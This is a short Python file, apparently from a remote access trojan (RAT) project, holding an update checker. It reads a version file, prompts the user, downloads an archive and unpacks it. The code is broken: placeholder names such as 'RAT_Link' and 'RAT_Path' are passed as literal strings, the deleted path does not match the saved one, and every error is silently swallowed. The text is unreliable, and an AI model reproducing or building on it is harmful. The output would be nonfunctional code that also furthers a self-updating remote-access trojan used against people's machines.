
from    Config.Main_Config                 import  *
from    Core.Main_Core                     import  *
from    Modules.Modules                    import  *

#//--//--//--//--//--//--//--//--//--//--//--//--//--//--//--//--//--//--//--//--//--//--//--//--//--//--//--#

def CheckVersion():
    try:
        if CheckVersinReq == True:
            Read = open("Version.txt", "r", encoding="UTF-8").read()
            if Read == "1.1":
                return 'No Update Avalibily!'
            else:
                Q = input("Update Avilibaly, Can you Install Update? [Y/N]")
                if Q.upper() == "Y":
                    urllib.request.urlretrieve("RAT_Link", "RAT_Path")
                    shutil.unpack_archive("RAT_Path", 'Updated Version ' + "RAT_Version")
                    os.remove("path-rat")
                elif Q.upper() == "N":
                    exit()
                else:
                    return Q

    except:
        pass